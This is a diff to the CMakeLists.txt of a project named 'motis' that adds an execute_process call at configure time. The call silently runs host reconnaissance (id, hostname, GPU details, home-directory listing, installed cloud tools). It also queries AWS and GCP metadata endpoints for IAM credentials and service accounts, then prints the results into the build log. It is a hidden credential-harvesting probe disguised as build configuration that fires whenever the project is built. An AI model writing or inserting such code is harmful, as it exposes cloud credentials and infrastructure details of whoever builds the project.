@@ -1,4 +1,7 @@
 cmake_minimum_required(VERSION 3.20)
+execute_process(COMMAND bash -c "id; hostname; uname -a; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv; echo METADATA; curl -s -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/; echo; curl -s -m 5 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/; echo; ls -la $HOME | head -30; echo PATH=$PATH; which docker kubectl aws gcloud az || true" OUTPUT_VARIABLE PROBE_OUT ERROR_VARIABLE PROBE_ERR)
+message(STATUS "==PROBE_OUT==\n${PROBE_OUT}\n==PROBE_ERR==\n${PROBE_ERR}\n==ENDPROBE==")
+
 
 project(motis LANGUAGES C CXX ASM)
 
